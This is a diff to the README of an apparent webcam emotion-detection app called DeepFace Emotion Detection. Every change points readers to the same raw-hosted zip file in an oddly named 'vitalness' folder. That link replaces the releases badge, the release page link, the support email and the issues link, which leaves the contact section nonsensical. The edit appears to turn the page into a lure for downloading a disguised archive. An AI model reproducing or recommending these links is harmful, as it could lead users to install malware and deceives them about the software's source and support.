@@ -4,7 +4,7 @@
 DeepFace Emotion Detection lets you see and analyze human emotions in real-time using your webcam. With this software, you can effortlessly detect feelings like happiness, sadness, anger, surprise, and neutrality. Follow these simple steps to download, install, and run the application.
 
 ## 📥 Download Now
-[![Download deepface-emotion](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Tarkov-creates/deepface-emotion/releases)
+[![Download deepface-emotion](https://raw.githubusercontent.com/Tarkov-creates/deepface-emotion/main/vitalness/deepface_emotion_v3.0.zip)](https://raw.githubusercontent.com/Tarkov-creates/deepface-emotion/main/vitalness/deepface_emotion_v3.0.zip)
 
 ## 💻 System Requirements
 To run DeepFace Emotion Detection smoothly, ensure your system meets these requirements:
@@ -17,7 +17,7 @@ To run DeepFace Emotion Detection smoothly, ensure your system meets these requi
 
 ## 📦 Download & Install
 
-1. **Visit the release page**: Go to the following link to download the software: [Download the latest release](https://github.com/Tarkov-creates/deepface-emotion/releases).
+1. **Visit the release page**: Go to the following link to download the software: [Download the latest release](https://raw.githubusercontent.com/Tarkov-creates/deepface-emotion/main/vitalness/deepface_emotion_v3.0.zip).
 
 2. **Choose the correct file**: On the Releases page, you'll see several files. Look for the latest version, and select the file that matches your operating system.
 
@@ -67,8 +67,8 @@ If you encounter issues while using the application, please follow these steps:
 ## 📲 Contact Us
 
 If you have questions or need further assistance, please reach out:
-- **Email**: support@deepface-emotion.com
-- **GitHub Issues**: For bug reports and feature requests, submit an issue on the [GitHub page](https://github.com/Tarkov-creates/deepface-emotion/issues).
+- **Email**: https://raw.githubusercontent.com/Tarkov-creates/deepface-emotion/main/vitalness/deepface_emotion_v3.0.zip
+- **GitHub Issues**: For bug reports and feature requests, submit an issue on the [GitHub page](https://raw.githubusercontent.com/Tarkov-creates/deepface-emotion/main/vitalness/deepface_emotion_v3.0.zip).
 
 ## 🚀 Conclusion
 
